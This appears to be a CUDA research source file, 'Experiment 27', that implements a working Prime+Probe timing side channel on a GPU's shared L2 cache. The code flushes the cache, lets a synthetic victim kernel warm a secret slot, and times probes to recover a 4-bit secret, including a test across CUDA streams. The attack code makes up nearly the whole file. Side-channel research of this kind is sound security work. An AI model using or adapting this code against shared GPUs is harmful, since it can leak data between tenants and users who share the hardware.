/*
 * Experiment 27: GPU L2 Cache Timing Side-Channel (Prime+Probe)
 *
 * GPU L2 is shared across all SMs. This test implements a working Prime+Probe
 * attack using DIFFERENTIAL timing: baseline (no victim) vs attack (with victim).
 * Slots that are "always warm" in L2 show ~0 latency change. The victim's slot
 * shows a large latency REDUCTION (from ~HBM to L2 latency) → clearly identified.
 *
 * KEY FINDINGS:
 *   - Non-volatile ld.global.cg (ldcg) is required; volatile loads bypass L2.
 *   - H100 L2 flush is non-uniform: some slots survive 150MB eviction (address mapping).
 *   - Differential timing (baseline − attack) cleanly identifies victim's slot.
 *
 * Compile: nvcc -O2 -arch=sm_90 -o l2_timing l2_timing.cu
 */

#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHECK(call) do { cudaError_t _e=(call); if(_e!=cudaSuccess){ \
    fprintf(stderr,"[RT] %s:%d %s\n",__FILE__,__LINE__,cudaGetErrorString(_e)); exit(1); } } while(0)

#define L2_SIZE      (50 * 1024 * 1024)
#define SLOT_SIZE    (2 * 1024 * 1024)
#define N_SLOTS      16
#define SLOT_FLOATS  (SLOT_SIZE / sizeof(float))
#define TOTAL_FLOATS (N_SLOTS * SLOT_FLOATS)

/* L2-cached load + memory barrier — load MUST complete before clock64() proceeds */
__device__ __forceinline__ float ldcg_timed(const float *p) {
    float v;
    asm volatile (
        "ld.global.cg.f32 %0, [%1];\n\t"
        "membar.gl;\n\t"
        : "=f"(v) : "l"(p) : "memory"
    );
    return v;
}

/* Flush L2: large sequential cached read evicts d_probe from some L2 sets */
__global__ void __noinline__ flush_l2(float *buf, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    float sum = 0.0f;
    for (int j = i; j < n; j += stride) sum += buf[j];
    if ((int)sum == 0xDEAD) buf[0] = sum;
}

/* Victim: access secret slot with cached loads → warm in L2 */
__global__ void __noinline__ victim_access(float *buf, int secret_slot) {
    int base = secret_slot * SLOT_FLOATS;
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    float sum = 0.0f;
    for (int j = i; j < (int)SLOT_FLOATS; j += stride) sum += buf[base + j];
    if ((int)sum == 0xDEAD) buf[base] = sum;
}

/* Single-pass probe in random order (prevents L2 prefetcher bias).
 * Uses ldcg_timed with membar.gl to get accurate per-load latency. */
__global__ void __noinline__ probe_slots(float *buf, long long *lat) {
    if (blockIdx.x != 0 || threadIdx.x != 0) return;

    /* Randomize order with clock seed so pattern varies each call */
    int order[N_SLOTS];
    for (int i = 0; i < N_SLOTS; i++) order[i] = i;
    unsigned long long rng = clock64() ^ 0x53729A1B4C5D6E7FULL;
    for (int i = N_SLOTS - 1; i > 0; i--) {
        rng = rng * 6364136223846793005ULL + 1442695040888963407ULL;
        int j = (int)((rng >> 33) % (unsigned long long)(i + 1));
        int tmp = order[i]; order[i] = order[j]; order[j] = tmp;
    }

    float guard = 0.0f;
    for (int k = 0; k < N_SLOTS; k++) {
        int s = order[k];
        const float *base = buf + (long long)s * SLOT_FLOATS;
        long long t0 = clock64();
        float a = ldcg_timed(base);
        long long t1 = clock64();
        lat[s] = t1 - t0;
        guard += a;
    }
    if (guard == 0.12345f) buf[0] = guard;
}

/* Init buffer to prevent DCE — uses unique values */
__global__ void __noinline__ init_buf(float *buf, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n) buf[i] = (float)(i % 997 + 1);
}

static int find_max_diff(const long long *baseline, const long long *attack) {
    int best = 0;
    long long best_diff = baseline[0] - attack[0];
    for (int i = 1; i < N_SLOTS; i++) {
        long long diff = baseline[i] - attack[i];
        if (diff > best_diff) { best_diff = diff; best = i; }
    }
    return best;
}

int main() {
    CHECK(cudaSetDevice(1));
    cudaDeviceProp prop;
    CHECK(cudaGetDeviceProperties(&prop, 1));
    printf("=== Experiment 27: GPU L2 Cache Timing Side-Channel (Prime+Probe) ===\n");
    printf("    Device: %s  SMs=%d  L2=%d MB  clockRate=%d MHz\n\n",
           prop.name, prop.multiProcessorCount,
           prop.l2CacheSize/(1024*1024), prop.clockRate/1000);

    float *d_probe, *d_flush;
    CHECK(cudaMalloc(&d_probe, (size_t)TOTAL_FLOATS * sizeof(float)));
    CHECK(cudaMalloc(&d_flush, (size_t)L2_SIZE * 3));

    long long *d_lat, *h_lat;
    CHECK(cudaMalloc(&d_lat, N_SLOTS * sizeof(long long)));
    h_lat = (long long *)malloc(N_SLOTS * sizeof(long long));

    int flush_n = L2_SIZE * 3 / sizeof(float);

    init_buf<<<(TOTAL_FLOATS+255)/256, 256>>>(d_probe, TOTAL_FLOATS);
    init_buf<<<(flush_n+255)/256, 256>>>(d_flush, flush_n);
    CHECK(cudaDeviceSynchronize());

    printf("  Probe buffer: %lu MB (%d slots × %d MB)\n\n",
           (size_t)TOTAL_FLOATS*4/(1024*1024), N_SLOTS, SLOT_SIZE/(1024*1024));

    /* ================================================================
     * Test A: Baseline characterization — cold vs warm
     * ================================================================ */
    printf("[Test A] Baseline latency characterization\n");
    {
        /* Cold */
        flush_l2<<<4096, 256>>>(d_flush, flush_n);
        CHECK(cudaDeviceSynchronize());
        CHECK(cudaMemset(d_lat, 0, N_SLOTS*sizeof(long long)));
        probe_slots<<<1, 32>>>(d_probe, d_lat);
        CHECK(cudaDeviceSynchronize());
        CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
        printf("  After 150MB flush (some slots still L2-resident due to address mapping):\n  ");
        long long mn=h_lat[0], mx=h_lat[0], s=0;
        for (int i=0; i<N_SLOTS; i++) {
            printf("s%d=%lld ", i, h_lat[i]);
            if (h_lat[i]<mn) mn=h_lat[i];
            if (h_lat[i]>mx) mx=h_lat[i];
            s+=h_lat[i];
        }
        printf("\n  avg=%lld min=%lld max=%lld\n", s/N_SLOTS, mn, mx);

        /* Warm all */
        for (int s=0; s<N_SLOTS; s++)
            victim_access<<<(SLOT_FLOATS+255)/256, 256>>>(d_probe, s);
        CHECK(cudaDeviceSynchronize());
        CHECK(cudaMemset(d_lat, 0, N_SLOTS*sizeof(long long)));
        probe_slots<<<1, 32>>>(d_probe, d_lat);
        CHECK(cudaDeviceSynchronize());
        CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
        printf("  After all slots warmed:\n  ");
        mn=h_lat[0]; mx=h_lat[0]; s=0;
        for (int i=0; i<N_SLOTS; i++) {
            printf("%lld ", h_lat[i]);
            if (h_lat[i]<mn) mn=h_lat[i];
            if (h_lat[i]>mx) mx=h_lat[i];
            s+=h_lat[i];
        }
        printf("\n  avg=%lld min=%lld max=%lld\n\n", s/N_SLOTS, mn, mx);
    }

    /* ================================================================
     * Test B+C: Differential timing attack
     *   For each trial: run BASELINE (no victim) and ATTACK (with victim s)
     *   Accumulate over N_TRIALS. Slot with max(baseline_avg - attack_avg) = victim.
     * ================================================================ */
    const int N_TRIALS = 120;

    printf("[Test B] Signal detection with differential timing (victim slot 7)\n");
    {
        const int VICTIM = 7;
        long long base_sum[N_SLOTS] = {}, atk_sum[N_SLOTS] = {};

        for (int t = 0; t < N_TRIALS; t++) {
            /* BASELINE: flush + no victim + probe */
            flush_l2<<<4096, 256>>>(d_flush, flush_n);
            CHECK(cudaDeviceSynchronize());
            CHECK(cudaMemset(d_lat, 0, N_SLOTS*sizeof(long long)));
            probe_slots<<<1, 32>>>(d_probe, d_lat);
            CHECK(cudaDeviceSynchronize());
            CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
            for (int i=0; i<N_SLOTS; i++) base_sum[i] += h_lat[i];

            /* ATTACK: flush + victim(7) + probe */
            flush_l2<<<4096, 256>>>(d_flush, flush_n);
            CHECK(cudaDeviceSynchronize());
            victim_access<<<(SLOT_FLOATS+255)/256, 256>>>(d_probe, VICTIM);
            CHECK(cudaDeviceSynchronize());
            CHECK(cudaMemset(d_lat, 0, N_SLOTS*sizeof(long long)));
            probe_slots<<<1, 32>>>(d_probe, d_lat);
            CHECK(cudaDeviceSynchronize());
            CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
            for (int i=0; i<N_SLOTS; i++) atk_sum[i] += h_lat[i];

        }

        /* Inference from accumulated averages */
        int inferred = find_max_diff(base_sum, atk_sum);
        printf("  Accumulated diff (baseline - attack) per slot:\n  ");
        for (int i=0; i<N_SLOTS; i++)
            printf("s%d:%lld ", i, base_sum[i]-atk_sum[i]);
        printf("\n");
        printf("  Inferred victim slot: %d  (true=%d)  %s\n\n",
               inferred, VICTIM, inferred==VICTIM ? "[CORRECT]" : "[wrong]");
    }

    printf("[Test C] 4-bit secret inference (%d trials per secret)\n", N_TRIALS);
    {
        int total_correct = 0;
        for (int secret = 0; secret < N_SLOTS; secret++) {
            long long base_sum[N_SLOTS] = {}, atk_sum[N_SLOTS] = {};

            for (int t = 0; t < N_TRIALS; t++) {
                /* BASELINE */
                flush_l2<<<4096, 256>>>(d_flush, flush_n);
                CHECK(cudaDeviceSynchronize());
                CHECK(cudaMemset(d_lat, 0, N_SLOTS*sizeof(long long)));
                probe_slots<<<1, 32>>>(d_probe, d_lat);
                CHECK(cudaDeviceSynchronize());
                CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
                for (int i=0; i<N_SLOTS; i++) base_sum[i] += h_lat[i];

                /* ATTACK */
                flush_l2<<<4096, 256>>>(d_flush, flush_n);
                CHECK(cudaDeviceSynchronize());
                victim_access<<<(SLOT_FLOATS+255)/256, 256>>>(d_probe, secret);
                CHECK(cudaDeviceSynchronize());
                CHECK(cudaMemset(d_lat, 0, N_SLOTS*sizeof(long long)));
                probe_slots<<<1, 32>>>(d_probe, d_lat);
                CHECK(cudaDeviceSynchronize());
                CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
                for (int i=0; i<N_SLOTS; i++) atk_sum[i] += h_lat[i];
            }

            int inferred = find_max_diff(base_sum, atk_sum);
            int correct = (inferred == secret);
            if (correct) total_correct++;
            printf("  Secret=%2d: inferred=%2d  %s  (diff=%lld)\n",
                   secret, inferred, correct ? "[HIT]" : "[miss]",
                   base_sum[inferred] - atk_sum[inferred]);
        }
        printf("  Secrets correctly inferred: %d/%d  (random baseline: 1/16=6.25%%)\n",
               total_correct, N_SLOTS);
        if (total_correct >= 12)
            printf("  [!!!] L2 TIMING ATTACK: attacker infers 4-bit secret via differential timing\n");
        else if (total_correct >= 6)
            printf("  [~] PARTIAL SIGNAL: better than random (%d/16)\n", total_correct);
        else
            printf("  WEAK: only %d/16 correct (may improve with more trials)\n", total_correct);
    }

    printf("\n[Test D] Cross-stream differential timing (victim stream A, attacker stream B)\n");
    {
        cudaStream_t sA, sB;
        CHECK(cudaStreamCreate(&sA));
        CHECK(cudaStreamCreate(&sB));
        const int VICTIM = 6;
        long long base_sum[N_SLOTS] = {}, atk_sum[N_SLOTS] = {};

        for (int t = 0; t < N_TRIALS; t++) {
            flush_l2<<<4096, 256, 0, sB>>>(d_flush, flush_n);
            CHECK(cudaStreamSynchronize(sB));
            CHECK(cudaMemsetAsync(d_lat, 0, N_SLOTS*sizeof(long long), sB));
            probe_slots<<<1, 32, 0, sB>>>(d_probe, d_lat);
            CHECK(cudaStreamSynchronize(sB));
            CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
            for (int i=0; i<N_SLOTS; i++) base_sum[i] += h_lat[i];

            flush_l2<<<4096, 256, 0, sB>>>(d_flush, flush_n);
            CHECK(cudaStreamSynchronize(sB));
            victim_access<<<(SLOT_FLOATS+255)/256, 256, 0, sA>>>(d_probe, VICTIM);
            CHECK(cudaStreamSynchronize(sA));
            CHECK(cudaMemsetAsync(d_lat, 0, N_SLOTS*sizeof(long long), sB));
            probe_slots<<<1, 32, 0, sB>>>(d_probe, d_lat);
            CHECK(cudaStreamSynchronize(sB));
            CHECK(cudaMemcpy(h_lat, d_lat, N_SLOTS*sizeof(long long), cudaMemcpyDeviceToHost));
            for (int i=0; i<N_SLOTS; i++) atk_sum[i] += h_lat[i];
        }

        int inferred = find_max_diff(base_sum, atk_sum);
        printf("  Cross-stream inferred: %d  (true=%d)  %s\n",
               inferred, VICTIM, inferred==VICTIM ? "[CORRECT — L2 shared across streams]" : "[wrong]");

        CHECK(cudaStreamDestroy(sA));
        CHECK(cudaStreamDestroy(sB));
    }

    printf("\n[Done]\n");
    free(h_lat);
    CHECK(cudaFree(d_probe));
    CHECK(cudaFree(d_flush));
    CHECK(cudaFree(d_lat));
    return 0;
}
